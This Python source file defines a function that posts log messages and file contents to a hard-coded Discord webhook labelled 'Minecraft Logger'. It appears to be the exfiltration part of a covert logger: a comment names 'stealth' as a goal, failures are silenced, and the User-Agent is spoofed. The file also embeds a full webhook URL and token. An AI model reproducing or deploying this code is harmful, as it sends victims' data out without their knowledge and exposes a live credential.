import json
import urllib.request
import socket

# CONFIGURATION - USER MUST UPDATE THIS
# Create a Webhook in your Discord Server -> Channel Settings -> Integrations -> Webhooks
WEBHOOK_URL = "https://discord.com/api/webhooks/1441457622497624158/P17Nx4YR36dDW3quHC3YBq-kYC7nSX2hskfHpD8Xts68xDAm7Z3k8NqkTfPQ85NRpKIb"

def is_connected():
    """Checks for internet connection."""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def send_log(message_content, file_content=None, filename="log.txt"):
    """Sends a log message to Discord via Webhook."""
    if not is_connected() or "YOUR_DISCORD_WEBHOOK_URL" in WEBHOOK_URL:
        return False

    try:
        # 1. Send the text message
        data = {
            "content": message_content,
            "username": "Minecraft Logger"
        }
        
        # If file content is small enough, we can send it as a code block
        # Discord limit is 2000 chars.
        if file_content:
            if len(file_content) < 1900:
                data["content"] += f"\n```\n{file_content}\n```"
            else:
                # For larger files, we would need multipart/form-data which is complex with urllib.
                # For simplicity/stealth, we will just truncate or send chunks.
                # Let's send the last 1900 characters for now.
                data["content"] += f"\n**[Log Truncated] Last 1900 chars:**\n```\n{file_content[-1900:]}\n```"

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        
        req = urllib.request.Request(
            WEBHOOK_URL, 
            data=json.dumps(data).encode('utf-8'), 
            headers=headers, 
            method='POST'
        )
        
        with urllib.request.urlopen(req) as response:
            return response.status == 204
            
    except Exception as e:
        # Silently fail
        return False
